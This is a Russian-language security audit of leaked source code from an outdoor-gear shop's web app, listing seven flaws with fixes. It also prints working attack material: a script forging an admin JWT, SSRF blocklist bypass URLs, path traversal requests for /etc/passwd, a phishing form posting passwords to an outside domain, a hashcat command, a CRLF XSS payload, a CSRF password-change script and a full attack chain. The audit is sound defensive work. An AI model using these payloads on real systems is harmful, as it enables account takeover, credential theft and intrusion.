Анализ файлов из утечки исходного кода магазина туристического снаряжения.
---

***Тип: Hardcoded JWT Secret and Weak JWT Secret***

**Риски:**
1. После утечки кода или подбора секрета злоумышленники смогут:
   - доступ к аккаунту любого пользователя
   - доступ к аккаунту администратора
   - доступ ко всем enpoints админа (а значит доступ к SSRF и Path Traversal leads to LFR см далее)

**Эксплуатация:**

Уязвимый код:
```
JWT_SECRET = "funkymonkey"
JWT_ALGORITHM = "HS256"

def auth_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        token = request.cookies.get("token")
        if not token:
            return jsonify(error="authentication required"), 401
        try:
            g.user = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGORITHM])
        except jwt.InvalidTokenError:
            return jsonify(error="invalid token"), 401
        return f(*args, **kwargs)
    return wrapper
```
1. Создаем токен для последующей подписи:
```
{
  "sub": "admin",
  "role": "admin",
  "iat": 1710000000,
  "exp": 1910000000
}
```
2. Подписываем и генерируем токен: (тут я предполагаю, что у нас уже есть секрет, либо нашли перебором, либо взяли из утечки кода)
```
import jwt, time

secret = "funkymonkey"

token = jwt.encode({
    "sub":"admin",
    "role":"admin",
    "iat":int(time.time()),
    "exp":int(time.time())+999999
}, secret, algorithm="HS256")
```
3. Отправляем токен как куки и получаем доступ к любому аккаунту. (в нашем случае к аккаунту админа, тк генерировали токен для него)

**Рекомендации по устранению:**
1. Хранить секрет в переменных окружения (точное значение секрета останется в переменной окружения, даже при условии утечки кода)
``` JWT_SECRET = os.environ["JWT_SECRET"] ```
2. Поменять секрет на рандомный и более сильный (тогда мы защитимся от подбора секрета). Можно сгенерировать так:
```
openssl rand -hex 64
```
3. Сменить тип шифрования на асимметричный (к примеру RS256) (приватный ключ остается на сервере и подписать токен самостоятельно не получится).

---

***Тип: SSRF in /api/admin/create_product***

Риски:
1. Доступ к внутренним сервисам и метаданным (Redis, docker, cloud services)

Эксплуатация:

Уязвимый код:
```
block_schemes = ["file", "gopher", "expect", "php", "dict", "ftp", "glob", "data"]
block_host = [ "127.0.0.1", "localhost", "localhost.localdomain", "local", "localdomain", 
              "::1", "ip6-localhost", "ip6-loopback", "0.0.0.0", "127.0.0.0", 
              "127.0.0.2", "127.0.0.3", "127.255.255.255", "127.0.0.255", "169.254.0.0", 
              "169.254.1.1", "169.254.255.255", "fe80::1", "fe80::", "localhost.local", 
              "localhost6", "localhost6.localdomain6", "ip6-localnet", "ip6-mcastprefix", 
              "ip6-allnodes", "ip6-allrouters", "255.255.255.255", "224.0.0.1", 
              "224.0.0.2", "ff02::1", "ff02::2", "local", "localhost.", 
              "localhost.localdomain.", "broadcasthost", "gateway", "router"]

@app.route("/api/admin/create_product", methods=["POST"])
@admin_required
@csrf_protect
def create_product():
    data = get_request_data()
    description = data.get("description", "")
    price = data.get("price", "")
    reviews = data.get("reviews", "")

    if not description or not price:
        return jsonify(error="Description and Price required"), 400
    
    if type(price) is not int:
        return jsonify(error="Price must be an integer"), 400
        
    if price <= 0:
        return jsonify(error="Price cannot be negative"), 400
    
    if reviews:
        decode_reviews = unquote(reviews)
        parsed = urlparse(decode_reviews)
        scheme = parsed.scheme.lower()
        host = parsed.netloc.lower()
        if parsed.username or parsed.password:
            return jsonify(error="Basic authentication in URL is not allowed"), 400
        if scheme in block_schemes:
            return jsonify(error="Input scheme is forbidden"), 400
        if host in block_host:
            return jsonify(error="Input hostname is forbidden"), 400
        try:
            target = urllib.request.urlopen(reviews)
            return jsonify({"message":"Product created successfully",
                    "description":description,
                    "price":price,
                    "reviews":target.read().decode('utf-8')}), 201
        except Exception as e:
            return jsonify({"error": str(e), "message": "Failed to create product"}), 400

    db.execute("INSERT INTO products (description, price) VALUES (?, ?)",
            (description, price))
    db.commit()
```
1. Отправляем запрос с следующим payload:
```
POST /api/admin/create_product
Cookie: token=<admin_jwt>

{
  "description":"x",
  "price":100,
  "reviews":"http://2130706433:5000/metrics"
}
```
еще варианты для rewiews
```
{
  "reviews":"http://[::ffff:127.0.0.1]:5000/metrics"
  "reviews":"http:127.0.0.1:5000/metrics"
}
```
2. (ps csrf токен можно подделать, см далее)

Рекомендации по устранению:
1. Использовать белые списки вместо черных списков. (заменить block_schemes и block_host на allowed_schemes и allowed_host к примеру)
2. Если возможно, то поменять дизайн обращения к этому endpoint. Сделать так, чтобы пользователь контролировал к примеру id у отзывов, но не полноценный url
```
{
  "review_id":"123"
}
```
и уже сервер строит путь 
```
url = f"https://reviews.internal/api/{review_id}"
```

---

***Тип: Path Traversal in /api/admin/view leads to Local File Read***

Риски:
1. Злоумышленник может прочитать приватные файлы на сервере (в том числе и source code).
2. В файлах можно найти ключи доступа, что ведет к дальнейшему раскрытию информации.

Эксплуатация:
Уязвимый код:
```
@app.route("/api/admin/view", methods=["GET"])
@admin_required
def view_file():
    files = []
    try:
        files = os.listdir(UPLOAD_FOLDER)
    except:
        pass

    filename = request.args.get("file", "")

    if not filename:
        return jsonify(error="no file name specified"), 400

    filename = filename.replace("../", "").replace("..\\", "")
    filepath = os.path.join(UPLOAD_FOLDER, filename)

    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            result = {"ok": True, "message": content}

        return jsonify(**result)

    except FileNotFoundError:
        return jsonify(error="file not found"), 400

    except Exception as e:
        return jsonify(error=f"error reading file {str(e)}"), 400
```
1. Отправляем следующий запрос:
```
GET /api/admin/view?file=..%252f..%252fapp.py
or
GET /api/admin/view?file=/etc/passwd
```
2. Читаем приватные файлы на сервере.

Рекомендации по устранению:
1. Не принимать абсолютные пути
```
if os.path.isabs(filename):
    abort(403)
```
2. Ввести ограничение пути
```
base = os.path.abspath(UPLOAD_FOLDER)
target = os.path.abspath(os.path.join(base, filename))

if not target.startswith(base):
    abort(403)
```

---

***Тип: Arbitrary File Upload***

Риски:
1. Загрузка вредоностных html, js, pdf файлов с безобидными разрешениями
2. Это ведет к:
   - Stored XSS
   - Malware hosting
(ps тк эта уязвимость есть только в админке, то смысл от XSS немного теряется, тк мы уже знаем куки администратора, но всё же можно использовать для фишинга, чтобы узнать пароль и закрепиться на аккаунте)

Эксплуатация:
Уязвимый код:
```
@app.route("/api/admin/upload", methods=["POST"])
@admin_required
@csrf_protect
def upload_file():
    files = []
    try:
        files = os.listdir(UPLOAD_FOLDER)
    except:
        pass

    if "file" not in request.files:
        return jsonify(error="no file selected"), 400

    file = request.files["file"]

    if file.filename == "":
        return jsonify(error="filename is empty"), 400

    if not is_allowed_file(file.filename):
        return jsonify(error="file extension not allowed"), 400

    filename = file.filename.replace("../", "").replace("..\\", "")

    save_path = os.path.join(UPLOAD_FOLDER, filename)
    file.save(save_path)

    return jsonify({"message": "file has been successfully uploaded"}), 200
```
1. Создаем файл poc.png
```
<html>
<body style="font-family:sans-serif">

<form action="https://out_domain.com/login" method="POST">
    <input name="username" placeholder="Login"><br><br>
    <input type="password" name="password" placeholder="Password"><br><br>
    <button>Login</button>
</form>

</body>
</html>
```
2. Получаем пароль от аккаунта и закрепляемся там.

Рекомендации по устранению:
1. Ввести валидацию MIME типа файла: 
```
import magic

ALLOWED_MIME = {
    "image/png",
    "image/jpeg",
    "image/gif",
    "application/pdf",
    "text/plain"
}

@app.route("/api/admin/upload", methods=["POST"])
@admin_required
@csrf_protect
def upload_file():
    ....
    header = file.stream.read(2048)
    mime = magic.from_buffer(header, mime=True)
    file.stream.seek(0)

    if mime not in ALLOWED_MIME:
        return jsonify(error=f"Forbidden MIME type: {mime}"), 400
    ....
```
2. Не использовать оригинальные имена файлов, чтобы было сложнее к ним обратиться (```uuid.uuid4().hex```)
3. Хранить файлы в специальной директории, где они будут не исполняемые. К примеру:
```
https://target.com/uploads/poc.png
```
Тут мы можем достучаться до файла извне, а если поместить файлы в директорию внутри сервера, то это будет невозможным (```/opt/app/private_uploads/``` или ```/home/app/uploads/```)
А отдавать файлы лучше через отдельный хендлер, где уже проверяются права, существование файла и потом бек его отдает:
```
@app.route("/download/<file_id>")
def download(file_id):
    filename = get_filename_from_db(file_id)
    path = os.path.join(UPLOAD_DIR, filename)

    if not os.path.isfile(path):
        abort(404)

    return send_file(path, as_attachment=True, download_name=filename)
```

---

***Тип: Weak Password Hashing***

Риски:
1. При утечке бд атакующий может спокойно подобрать и скомпроментировать все пароли пользователей.

Эксплуатация:
Уязвимый код:
```
def hash_password(pw):
    return hashlib.sha256(pw.encode()).hexdigest()
```
1. Получаем пароли и запускаем hashcat для подбора хешей. (```hashcat -m 1400 hashes.txt rockyou.txt```)
2. После завершения работы тулзы, у нас на руках готовые пароли пользователей.

Рекомендации по устранению:
1. Использовать библиотеку argon, чтобы хешировать пароли, а не шифровать (сама библиотека уже использует соль и надежный алгоритм шифрования)
```
from argon2 import PasswordHasher

ph = PasswordHasher()

hashed = ph.hash(password)

then..

try:
    ph.verify(hashed, password)
except:
    invalid_password()
```
2. Добавить сильную политику паролей, больше 10 символов, заглавные и строчные буквы, спец символы и тд.
3. Добавить двухфакторную аутентификацию, таким образом, даже при утечке паролей, атакующим будет сложнее попасть в аккаунт.

---

***Тип: Open Redirect in /go leads to XSS via CLRF injection***

Риски:
1. Через XSS можно украсть CSRF token (тк у нас httponly=False для него)
2. Redirect можно использовать для чейна атак, к примеру с xss

Эксплуатация:
Уязвимый код:
```
if path == "/go":
            qs = environ.get("QUERY_STRING", "")
            target = urllib.parse.parse_qs(qs).get("url", ["/"])[0]
            target = urllib.parse.unquote(target)
            start_response("302 Found", [
                ("Location", target),
                ("Content-Length", "0"),
            ])
            return [b""]

        return self.wsgi(environ, start_response)
```
1. Вариант использования чисто редиректа:
```
/go?url=https://evil.com
```
(Пользователь с доверенного сайта переходит на сайт злоумышленника)
2. Вариант использования с XSS
```
GET /go?url=%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%3cscript%3ealert%28%29%3c%2fscript%3e HTTP/1.1
```

Рекомендации по устранению:
1. Использовать белый список
2. Разрешать только внутренние пути на сайт
```
if not target.startswith("/"):
    abort(400)
```

---

***Тип: CSRF***

Риски:
1. Злоумышленник может изменить пароль на свой и закрепиться на аккаунте админа.

Эксплуатация:
Уязвимый код:
```
def set_auth_cookies(resp, username, role):
    token = issue_token(username, role)
    resp.set_cookie("token", token, httponly=True, samesite="None", max_age=JWT_TTL)
    resp.set_cookie("_csrf", secrets.token_hex(32), httponly=False, samesite="None", max_age=JWT_TTL)
    return resp
```
1. Подделываем JWT токен админа
2. Отправляем следующую полезную нагрузку в параметре url в редиректе:
```
const csrf_token = document.cookie.split('=')[1];
const response = fetch('/api/settings/password', {
    method: 'POST',
    credentials: 'include',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({ new_password: 'newpass', '_csrf' : `${csrf_token}`, })
});
```

Рекомендации по устранению:
1. Поставить дополнительные флаги на токен, чтобы его нельзя было читать через js
```
resp.set_cookie("_csrf", value, httponly=True, samesite="Strict", secure=True)
```

---

Цепочка, которую можно построить через эти уязвимости:
1. Через XSS в редиректе эсксплуатируем CSRF и меняем пароль в аккаунте админа
2. После закрепления в аккаунте админа используем Path Traversal и Local File Read чтобы прочитать приватные файлы на сервере
3. Используем SSRF чтобы обратиться к внутренним сервисам и скомпроментировать их
